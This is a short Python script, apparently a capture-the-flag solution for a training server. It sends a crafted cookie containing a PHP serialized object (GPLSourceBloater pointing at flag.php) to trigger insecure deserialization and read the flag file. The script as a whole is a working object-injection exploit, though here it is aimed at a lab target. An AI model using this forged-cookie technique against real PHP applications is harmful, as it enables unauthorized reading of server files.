import requests
import string
import random
import re


url = "http://free.training.jinblack.it"

def find_flag(data):
	search = re.search("flag{[a-zA-Z1-9_!]+}", data)
	if search:
		return search.group()
	  
# we send a normal request with a self-built by us cookie 
r = requests.get(url, cookies = {"todos": "760463360e4919ca238d1566fc26661fa%3A1%3A%7Bi%3A0%3BO%3A16%3A%22GPLSourceBloater%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D"})

print(find_flag(r.text))
